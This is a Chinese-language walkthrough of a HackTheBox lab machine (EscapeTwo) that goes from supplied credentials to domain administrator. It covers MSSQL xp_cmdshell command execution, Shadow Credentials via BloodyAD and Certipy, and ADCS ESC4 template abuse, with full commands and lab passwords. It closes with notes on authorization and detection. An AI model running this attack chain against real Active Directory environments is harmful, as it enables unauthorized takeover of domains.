#  利用MSSQL与ADCS漏洞：攻破域控?  
 柠檬赏金猎人   2026-02-20 02:00  
  
### 概述  

  
Windows域环境渗透测试场景，从给定的初始凭证（Assume Breach）开始，通过分析损坏的Excel文件获取更多凭证，进而利用MSSQL的xp_cmdshell功能获取初始立足点。随后，通过权限提升和滥用Active Directory Certificate Services (ADCS)中的ESC4漏洞，最终获得域管理员权限。整个过程涵盖了SMB枚举、MSSQL利用、Bloodhound分析、Shadow Credentials攻击以及ADCS漏洞利用等多种技术。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/KysoJFiczHUsS4ZmQicn7strPyvnsd3UZHOoeqnQK7lRNWhyT8D4fPsicIo1sic61H96NT48ibWgNVsTMxrianGj9fvBvlDUFI0Ac4L1w2ibuMMxiaM/640?wx_fmt=jpeg "")  

### 技术/功能  

- **初始信息收集**：使用Nmap进行端口扫描，识别开放服务（如SMB, MSSQL, LDAP, Kerberos等）。  
  
- **凭证验证与枚举**：利用NetExec验证初始凭证并枚举SMB共享。  
  
- **文件分析**：修复损坏的Excel文件（.xlsx），提取隐藏的用户名和密码。  
  
- **MSSQL利用**：使用提取的sa账户凭证连接MSSQL，启用xp_cmdshell执行系统命令，获取反向Shell。  
  
- **权限提升**：在文件系统中发现服务账户密码，通过Bloodhound分析域内权限关系，利用WriteOwner权限对服务账户ca_svc进行Shadow Credentials攻击。  
  
- **ADCS漏洞利用**：利用ca_svc账户的权限，修改证书模板（ESC4），使其易受ESC1攻击，最终为域管理员Administrator请求证书并获取NTLM哈希。  
  
- **最终访问**：使用域管理员的NTLM哈希通过WinRM获得完全控制。  
  

### 使用示例  

#### 1. 初始扫描与枚举  

```
nmap -p- --min-rate 10000 -sCV 10.10.11.51netexec smb dc01.sequel.htb -u rose -p 'KxEPkKe6R8su' --shares
```  

#### 2. 分析并修复损坏的Excel文件  

```
# 方法一：直接解压（文件被识别为ZIP）unzip accounts.xlsx -d accountscat accounts/xl/sharedStrings.xml | xmllint --xpath '//*[local-name()="t"]/text()' - | awk 'ORS=NR%5?",":""'# 方法二：修复文件头（将前4字节改为50 4B 03 04）xxd accounts.xlsx | head -1# 使用hex编辑器修改文件头后，用LibreOffice打开
```  

#### 3. 利用MSSQL获取Shell  

```
# 使用sa凭证连接并启用xp_cmdshellmssqlclient.py 'sequel.htb/sa:MSSQLP@ssw0rd!@dc01.sequel.htb'SQL> enable_xp_cmdshellSQL> xp_cmdshell 'powershell -e '
```  

#### 4. 使用Bloodhound分析域权限  

```
netexec ldap dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --bloodhound --collection All --dns-server 10.10.11.51# 将生成的ZIP文件导入Bloodhound UI，分析权限关系
```  

#### 5. Shadow Credentials攻击  

```
# 使用BloodyAD修改目标对象的所有者并添加完全控制权限bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryanbloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan# 使用Certipy添加Shadow Credential并获取NTLM哈希certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
```  

#### 6. 利用ADCS ESC4漏洞  

```
# 使用Certipy修改证书模板，使其易受ESC1攻击（Certipy 4.8.2）certipy template -u ca_svc -hashes  -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -target dc01.sequel.htb -save-oldcertipy req -ca sequel-DC01-CA -u ca_svc -hashes  -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htbcertipy auth -pfx administrator.pfx# 使用Certipy 5.0.2（新命令）certipy template -u ca_svc@sequel.htb -hashes  -template DunderMifflinAuthentication -write-default-configuration -no-savecertipy req -u ca_svc@sequel.htb -hashes  -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htbcertipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
```  

#### 7. 使用域管理员哈希获取Shell  

```
evil-winrm -u administrator -H <ntlm_hash> -i dc01.sequel.htb
```  

### 注意事项  

1. **合法授权**：仅在有明确授权的环境中进行测试，禁止对未授权系统进行任何操作。  
  
1. **工具使用**：确保使用的工具（如NetExec、Certipy、BloodyAD）为最新版本，避免因版本差异导致命令失败。  
  
1. **证书模板修改**：在修改ADCS证书模板时，务必理解其影响，并在测试后尽可能恢复原状（使用-save-old保存的配置）。  
  
1. **防御措施**：企业应定期审计ADCS证书模板的权限设置，限制Cert Publishers等组的过高权限，并监控异常证书请求。  
  
1. **检测与响应**：监控域内对象的所有者变更、Shadow Credentials添加行为以及异常的证书颁发请求，这些可能是攻击迹象。  
  

### 参考链接  

- https://hackthebox.com/machines/escapetwo  
  
- https://github.com/Pennyw0rth/NetExec  
  
- https://github.com/fortra/impacket  
  
- https://github.com/ly4k/Certipy  
  
- https://github.com/CravateRouge/bloodyAD  
  
- https://bloodhound.specterops.io/  
  
- https://www.revshells.com/  
  
- https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/  
  


  
仅限交流学习使用，如您在使用本工具或代码的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。“如侵权请私聊公众号删文”。  

  
  
